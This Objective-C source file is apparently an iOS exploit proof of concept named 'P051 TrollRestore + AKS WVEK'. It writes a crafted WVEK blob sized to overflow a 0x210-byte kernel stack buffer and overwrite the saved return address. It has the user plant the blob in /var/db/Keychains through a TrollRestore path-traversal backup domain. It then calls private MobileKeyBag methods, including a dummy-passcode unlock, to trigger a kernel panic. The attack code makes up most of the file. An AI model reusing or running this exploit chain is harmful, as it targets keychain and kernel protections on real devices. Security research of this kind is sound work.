#import "P051APFSXattr.h"
#import "LabLocalTime.h"
#import "LabRuntimeOffsets.h"
#import "A14_23F77_LabOffsets.h"

#import <Foundation/Foundation.h>
#import <sys/stat.h>
#import <sys/ioctl.h>
#import <sys/mount.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <fcntl.h>
#import <string.h>
#import <stdlib.h>
#import <dlfcn.h>
#import <objc/message.h>
#import <objc/runtime.h>

#define P051_BUILD @"p051-trollrestore-aks-v5"

static int g_log_fd = -1;

static void p051_log(NSMutableString *buf, NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [buf appendString:out];
    if (g_log_fd >= 0) {
        write(g_log_fd, out.UTF8String, strlen(out.UTF8String));
        fcntl(g_log_fd, F_FULLFSYNC);
    }
}

@implementation P051APFSXattr

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *logPath = [docs stringByAppendingPathComponent:@"p051_apfs_xattr_log.txt"];
    g_log_fd = open([logPath UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
    
    p051_log(log, @"=== P051 TrollRestore + AKS WVEK ===");
    p051_log(log, @"BUILD: %@", P051_BUILD);
    
    const LabOffTab *off = LabOff();
    p051_log(log, @"Device: %s", off->tag);
    
    uint64_t wvek_addr = off->aks_wvek_overflow;
    if (wvek_addr == 0) {
        p051_log(log, @"[-] No aks_wvek_overflow in offsets");
        if (g_log_fd >= 0) {
            fcntl(g_log_fd, F_FULLFSYNC);
            close(g_log_fd);
            g_log_fd = -1;
        }
        return log;
    }
    p051_log(log, @"[+] apfs_aks_create_wvek: 0x%llx", wvek_addr);
    
    // Phase 1: Write crafted wvek via TrollRestore
    p051_log(log, @"\n[*] Phase 1: Preparing TrollRestore payload");
    
    NSData *wvekPayload = [self craftWVEKPayload];
    NSString *payloadPath = [docs stringByAppendingPathComponent:@"wvek_payload.bin"];
    [wvekPayload writeToFile:payloadPath atomically:NO];
    
    p051_log(log, @"[+] Payload written to: %@", payloadPath);
    p051_log(log, @"[*] Payload size: %zu bytes (overflow at 0x210)", wvekPayload.length);
    
    // Phase 2: Trigger TrollRestore (Python wrapper handles this)
    p051_log(log, @"\n[*] Phase 2: Execute TrollRestore Python script");
    p051_log(log, @"    Target: /var/db/Keychains/pwned_wvek");
    p051_log(log, @"    Domain: SysContainerDomain-../../../../../../../..");
    
    // Check if payload was restored (by checking if marker file exists)
    NSString *markerPath = @"/var/db/Keychains/pwned_wvek";
    BOOL exists = [[NSFileManager defaultManager] fileExistsAtPath:markerPath];
    p051_log(log, @"    Payload restored: %@", exists ? @"YES" : @"NO (run Python script)");
    
    if (!exists) {
        p051_log(log, @"\n[!] INSTRUCTIONS:");
        p051_log(log, @"    1. Disable Find My on device");
        p051_log(log, @"    2. Run: python3 p051_trollrestore.py");
        p051_log(log, @"    3. Re-run this app after restore completes");
        if (g_log_fd >= 0) {
            fcntl(g_log_fd, F_FULLFSYNC);
            close(g_log_fd);
            g_log_fd = -1;
        }
        return log;
    }
    
    // Phase 3: Trigger AKS to parse the crafted wvek
    p051_log(log, @"\n[*] Phase 3: Triggering AKS via MobileKeyBag");
    
    void *mkb = dlopen("/System/Library/PrivateFrameworks/MobileKeyBag.framework/MobileKeyBag", RTLD_LAZY);
    if (!mkb) {
        p051_log(log, @"[-] MobileKeyBag load failed: %s", dlerror());
        return log;
    }
    
    Class kbClass = objc_getClass("MKBKeyBag");
    if (!kbClass) {
        p051_log(log, @"[-] MKBKeyBag class not found");
        return log;
    }
    
    id proxy = ((id (*)(Class, SEL))objc_msgSend)(kbClass, NSSelectorFromString(@"daemonProxy"));
    if (!proxy) {
        p051_log(log, @"[-] daemonProxy returned nil");
        return log;
    }
    p051_log(log, @"[+] Got MKBKeyBag proxy");
    
    // Try multiple methods to trigger keybag reload
    NSArray *triggers = @[
        @"reloadKeybagWithCompletion:",
        @"synchronizeKeybagWithCompletion:",
        @"unlockWithPasscode:completion:",
        @"beginRecovery:"
    ];
    
    for (NSString *selName in triggers) {
        SEL sel = NSSelectorFromString(selName);
        if (![proxy respondsToSelector:sel]) continue;
        
        p051_log(log, @"[*] Trying %@...", selName);
        
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        
        if ([selName isEqualToString:@"unlockWithPasscode:completion:"]) {
            ((void (*)(id, SEL, id, id))objc_msgSend)(proxy, sel, @"AAAAAAAA",
                ^(BOOL success, NSError *err) {
                    p051_log(log, @"    Result: success=%d, err=%@", success, err);
                    dispatch_semaphore_signal(sem);
                });
        } else {
            ((void (*)(id, SEL, id))objc_msgSend)(proxy, sel,
                ^(BOOL success, NSError *err) {
                    p051_log(log, @"    Result: success=%d, err=%@", success, err);
                    dispatch_semaphore_signal(sem);
                });
        }
        
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    }
    
    p051_log(log, @"\n[*] Phase 4: Waiting for kernel panic...");
    p051_log(log, @"    Expected: stack guard mismatch at offset 0x210");
    p051_log(log, @"    If no panic, AKS path may be patched");
    
    // Keep alive to catch panic log
    sleep(10);
    
    p051_log(log, @"\n=== P051 Complete ===");
    if (g_log_fd >= 0) {
        fcntl(g_log_fd, F_FULLFSYNC);
        close(g_log_fd);
        g_log_fd = -1;
    }
    return log;
}

+ (NSData *)craftWVEKPayload {
    /*
     * Craft wvek to overflow auStack_[528] in apfs_aks_create_wvek
     * Target: memcpy to stack buffer if len <= 0x210 else BRK
     * We want len = 0x218 to overflow past 0x210 boundary
     */
    size_t payload_len = 0x218;
    NSMutableData *data = [NSMutableData dataWithLength:payload_len];
    uint8_t *bytes = (uint8_t *)data.mutableBytes;
    
    // WVEK header
    memcpy(bytes, "WVEK", 4);
    
    // Fill with pattern
    for (size_t i = 4; i < 0x210; i += 8) {
        uint64_t val = 0x4141414141414100ULL + (i / 8);
        memcpy(bytes + i, &val, 8);
    }
    
    // Overflow region at 0x210
    uint64_t *overflow = (uint64_t *)(bytes + 0x210);
    overflow[0] = 0x4444444444444444ULL; // Overwrites saved LR
    overflow[1] = 0x4545454545454545ULL; // Overwrites saved FP
    
    return data;
}

@end
